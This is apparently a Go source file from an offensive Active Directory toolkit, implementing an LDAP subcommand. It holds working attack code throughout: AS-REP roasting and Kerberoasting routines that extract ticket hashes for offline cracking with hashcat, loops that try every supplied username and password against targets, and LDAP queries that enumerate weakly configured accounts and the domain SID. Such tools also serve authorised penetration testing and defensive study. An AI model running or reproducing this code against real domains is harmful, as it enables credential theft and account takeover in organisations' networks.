package runner

import (
	"fmt"
	"strings"
	"sync"

	"github.com/5amu/goad/pkg/kerberos"
	"github.com/5amu/goad/pkg/ldap"
	"github.com/5amu/goad/pkg/utils"
	"github.com/jessevdk/go-flags"
)

const (
	ldapKerberoastableFilter   = "(&(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(servicePrincipalName=*))"
	passwordNotRequiredFilter  = "(&(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(userAccountControl:1.2.840.113556.1.4.803:=32))"
	passwordNeverExpiresFilter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
	enumerationUserFilter      = "(&(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
	getDomainSIDFilter         = "(userAccountControl:1.2.840.113556.1.4.803:=8192)"
)

type LdapConnectionOptions struct {
	Targets struct {
		TARGETS []string
	} `positional-args:"yes" description:"Provide target IP/FQDN/FILE"`
	targets   []string
	Username  string `short:"u" description:"Provide username (or FILE)"`
	usernames []string
	Password  string `short:"p" description:"Provide password (or FILE)"`
	passwords []string
	Domain    string `short:"d" long:"domain" description:"Provide domain"`
	Port      int    `long:"port" default:"389" description:"Ldap port to contact"`
	SSL       bool   `short:"s" long:"ssl" description:"Use ssl to interact with ldap"`
	UseTLS    bool   `long:"tls" description:"Upgrade the ldap connection"`
}

type LdapHashOptions struct {
	AsrepRoast string `long:"asreproast" description:"Grab AS_REP ticket(s) parsed to be cracked with hashcat"`
	Kerberoast string `long:"kerberoast" description:"Grab TGS ticket(s) parsed to be cracked with hashcat"`
}

type LdapEnumerationOptions struct {
	TrustedForDelegation bool `long:"trusted-for-delegation" description:"Get the list of users and computers with flag TRUSTED_FOR_DELEGATION"`
	PasswordNotRequired  bool `long:"password-not-required" description:"Get the list of users with flag PASSWD_NOTREQD"`
	PasswordNeverExpires bool `long:"password-never-expires" description:"Get the list of accounts with flag DONT_EXPIRE_PASSWD"`
	AdminCount           bool `long:"admin-count" description:"Get objets that had the value adminCount=1"`
	UsersEnum            bool `long:"users" description:"Enumerate enabled domain users"`
	GroupsEnum           bool `long:"groups" description:"Enumerate domain groups"`
	DCList               bool `long:"dc-list" description:"Enumerate Domain Controllers"`
	GetSID               bool `long:"get-sid" description:"Get domain sid"`
}

type LdapGMSAOptions struct {
	GMSA           bool   `long:"gmsa" description:"Enumerate GMSA passwords"`
	GMSAConvertID  string `long:"gmsa-convert-id" description:"Get the secret name of specific gmsa or all gmsa if no gmsa provided"`
	GMSADecryptLSA string `long:"gmsa-decrypt-lsa" description:"Decrypt the gmsa encrypted value from LSA"`
}

type LdapBloodhoundOptions struct {
	Bloodhound           string   `long:"bloodhound" description:"Run bloodhound collector (v4.2) and save in output file (zip)"`
	BloodhoundNameserver string   `short:"n" long:"nameserver" description:"Provide a nameserver for bloodhound collector"`
	Collection           []string `short:"c" long:"collection" default:"Default" description:"Which information to collect. Supported: Group, LocalAdmin, Session, Trusts, Default, DCOnly, DCOM, RDP, PSRemote, LoggedOn, Container, ObjectProps, ACL, All"`
}

type LdapOptions struct {
	Connection  LdapConnectionOptions
	Hash        LdapHashOptions
	Enumeration LdapEnumerationOptions
	GMSA        LdapGMSAOptions
	Bloodhound  LdapBloodhoundOptions
}

func ExecuteLdapSubcommand(args []string) (err error) {
	l := flags.NewNamedParser("GoAD ldap", flags.Default)

	var ldapConnection LdapConnectionOptions
	l.AddGroup("Connection Options", "", &ldapConnection)

	var ldapHashes LdapHashOptions
	l.AddGroup("Hash Retrieval Options", "", &ldapHashes)

	var ldapEnumeration LdapEnumerationOptions
	l.AddGroup("Enumeration Options", "", &ldapEnumeration)

	var ldapGmsa LdapGMSAOptions
	l.AddGroup("Play with GMSA", "", &ldapGmsa)

	var ldapBloodhound LdapBloodhoundOptions
	l.AddGroup("Run Bloodhound Collector v4.2", "", &ldapBloodhound)

	if len(args) == 0 {
		return nil
	}

	if _, err := l.ParseArgs(args); err != nil {
		return nil
	}

	ldap := LdapOptions{
		Connection:  ldapConnection,
		Hash:        ldapHashes,
		Enumeration: ldapEnumeration,
		GMSA:        ldapGmsa,
		Bloodhound:  ldapBloodhound,
	}

	ldap.Connection.usernames, err = utils.ReadLines(ldap.Connection.Username)
	if err != nil {
		ldap.Connection.usernames = []string{ldap.Connection.Username}
	}
	ldap.Connection.passwords, err = utils.ReadLines(ldap.Connection.Password)
	if err != nil {
		ldap.Connection.passwords = []string{ldap.Connection.Password}
	}
	for _, t := range ldap.Connection.Targets.TARGETS {
		lines, err := utils.ReadLines(t)
		if err != nil {
			ldap.Connection.targets = append(ldap.Connection.targets, t)
		} else {
			ldap.Connection.targets = append(ldap.Connection.targets, lines...)
		}
	}
	return ldap.run()
}

func (o *LdapOptions) run() error {
	var f func(string) error

	if o.Hash.AsrepRoast != "" {
		f = o.asreproast
	} else if o.Hash.Kerberoast != "" {
		f = o.kerberoast
	} else if o.Enumeration.PasswordNotRequired {
		f = o.passwordNotRequired
	} else if o.Enumeration.UsersEnum {
		f = o.userenum
	} else if o.Enumeration.PasswordNeverExpires {
		f = o.passwordNeverExpires
	} else if o.Enumeration.GetSID {
		f = o.domainSID
	} else {
		return fmt.Errorf("nothing to do")
	}

	var wg sync.WaitGroup
	for _, target := range o.Connection.targets {
		wg.Add(1)
		go func(t string) {
			if err := f(t); err != nil {
				fmt.Println(err)
			}
			wg.Done()
		}(target)
	}
	wg.Wait()
	return nil
}

func (o *LdapOptions) asreproast(target string) error {
	var res []string
	for _, user := range o.Connection.usernames {
		client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
		if err != nil {
			return err
		}
		asrep, err := client.GetAsReqTgt(user)
		if err == nil {
			hash := utils.ASREPToHashcat(*asrep.Ticket)
			fmt.Printf("[+] ASREP-Roastable user %s\\%s... happy cracking!\n\n%s\n\n", o.Connection.Domain, user, hash)
			res = append(res, hash)
		}
	}

	if len(res) == 0 {
		return fmt.Errorf("[%s] no asrep-roastable user found on target", target)
	}
	return utils.WriteLines(res, o.Hash.AsrepRoast)
}

func (o *LdapOptions) kerberoast(target string) error {
	basedn := fmt.Sprintf("dc=%s", strings.Join(strings.Split(o.Connection.Domain, "."), ",dc="))
	ldapClient := &ldap.LdapClient{
		Host:    target,
		Realm:   o.Connection.Domain,
		Port:    o.Connection.Port,
		BaseDN:  basedn,
		SkipTLS: !o.Connection.UseTLS,
		UseSSL:  o.Connection.SSL,
	}

	var res []string
	for _, user := range o.Connection.usernames {
		for _, password := range o.Connection.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
				continue
			}

			users, err := ldapClient.Search(ldapKerberoastableFilter, []string{"sAMAccountName", "servicePrincipalName"})
			if err != nil {
				fmt.Println(err)
				continue
			}
			ldapClient.Close()

			krb, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
			if err != nil {
				fmt.Println(err)
				continue
			}
			krb.AuthenticateWithPassword(user, password)

			for _, entry := range users.Entries {
				usr := entry.GetAttributeValue("sAMAccountName")
				spn := entry.GetAttributeValue("servicePrincipalName")
				tgs, err := krb.GetServiceTicket(usr, spn)
				if err != nil {
					fmt.Println(err)
					continue
				}
				hash := utils.TGSToHashcat(tgs.Ticket, usr)
				res = append(res, hash)
				fmt.Printf("[+] kerberoasted user %s\\%s for SPN %s... happy cracking!\n\n%s\n\n", o.Connection.Domain, user, spn, hash)
			}
		}
	}

	if len(res) == 0 {
		return fmt.Errorf("[%s] no kerberoastable user found on target", target)
	}
	return utils.WriteLines(res, o.Hash.Kerberoast)
}

func (o *LdapOptions) passwordNotRequired(target string) error {
	basedn := fmt.Sprintf("dc=%s", strings.Join(strings.Split(o.Connection.Domain, "."), ",dc="))
	ldapClient := &ldap.LdapClient{
		Host:    target,
		Realm:   o.Connection.Domain,
		Port:    o.Connection.Port,
		BaseDN:  basedn,
		SkipTLS: !o.Connection.UseTLS,
		UseSSL:  o.Connection.SSL,
	}

	for _, user := range o.Connection.usernames {
		for _, password := range o.Connection.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
				continue
			}

			users, err := ldapClient.Search(passwordNotRequiredFilter, []string{"sAMAccountName"})
			if err != nil {
				fmt.Println(err)
				continue
			}
			ldapClient.Close()

			if len(users.Entries) == 0 {
				return fmt.Errorf("no user with PASSWD_NOTREQD")
			}

			for _, entry := range users.Entries {
				usr := entry.GetAttributeValue("sAMAccountName")
				fmt.Printf("[%s]-[%s\\%s:%s] password not required for %s\\%s\n", target, o.Connection.Domain, user, password, o.Connection.Domain, usr)
			}
		}
	}
	return nil
}

func (o *LdapOptions) passwordNeverExpires(target string) error {
	basedn := fmt.Sprintf("dc=%s", strings.Join(strings.Split(o.Connection.Domain, "."), ",dc="))
	ldapClient := &ldap.LdapClient{
		Host:    target,
		Realm:   o.Connection.Domain,
		Port:    o.Connection.Port,
		BaseDN:  basedn,
		SkipTLS: !o.Connection.UseTLS,
		UseSSL:  o.Connection.SSL,
	}

	var found bool
	for _, user := range o.Connection.usernames {
		for _, password := range o.Connection.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
				continue
			}

			users, err := ldapClient.Search(passwordNeverExpiresFilter, []string{"sAMAccountName"})
			if err != nil {
				fmt.Println(err)
				continue
			}
			ldapClient.Close()

			if len(users.Entries) > 0 {
				found = true
			}

			for _, entry := range users.Entries {
				usr := entry.GetAttributeValue("sAMAccountName")
				fmt.Printf("[%s]-[%s\\%s\\%s] %s\\%s has a never expiring password\n", o.Connection.Domain, target, user, password, o.Connection.Domain, usr)
			}
		}
	}

	if !found {
		return fmt.Errorf("impossible to enumerate users with a never expiring password")
	}
	return nil
}

func (o *LdapOptions) userenum(target string) error {
	basedn := fmt.Sprintf("dc=%s", strings.Join(strings.Split(o.Connection.Domain, "."), ",dc="))
	ldapClient := &ldap.LdapClient{
		Host:    target,
		Realm:   o.Connection.Domain,
		Port:    o.Connection.Port,
		BaseDN:  basedn,
		SkipTLS: !o.Connection.UseTLS,
		UseSSL:  o.Connection.SSL,
	}

	var found bool
	for _, user := range o.Connection.usernames {
		for _, password := range o.Connection.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
				continue
			}

			users, err := ldapClient.Search(enumerationUserFilter, []string{"sAMAccountName"})
			if err != nil {
				fmt.Println(err)
				continue
			}
			ldapClient.Close()

			if len(users.Entries) > 0 {
				found = true
			}

			for _, entry := range users.Entries {
				usr := entry.GetAttributeValue("sAMAccountName")
				fmt.Printf("[%s]-[%s\\%s\\%s] found user %s\\%s\n", o.Connection.Domain, target, user, password, o.Connection.Domain, usr)
			}
		}
	}

	if !found {
		return fmt.Errorf("impossible to enumerate users")
	}
	return nil
}

func (o *LdapOptions) domainSID(target string) error {
	basedn := fmt.Sprintf("dc=%s", strings.Join(strings.Split(o.Connection.Domain, "."), ",dc="))
	ldapClient := &ldap.LdapClient{
		Host:    target,
		Realm:   o.Connection.Domain,
		Port:    o.Connection.Port,
		BaseDN:  basedn,
		SkipTLS: !o.Connection.UseTLS,
		UseSSL:  o.Connection.SSL,
	}

	var found bool
	for _, user := range o.Connection.usernames {
		for _, password := range o.Connection.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
				continue
			}

			users, err := ldapClient.Search(getDomainSIDFilter, []string{"objectSid"})
			if err != nil {
				fmt.Println(err)
				continue
			}
			ldapClient.Close()

			if len(users.Entries) > 0 {
				found = true
			}

			for _, entry := range users.Entries {
				sid := utils.DecodeSID([]byte(entry.GetAttributeValue("objectSid")))
				fmt.Printf("[%s]-[%s\\%s:%s] domain SID is %v\n", target, o.Connection.Domain, user, password, sid.String())
				return nil
			}
		}
	}

	if !found {
		return fmt.Errorf("impossible to get domain SID")
	}
	return nil
}
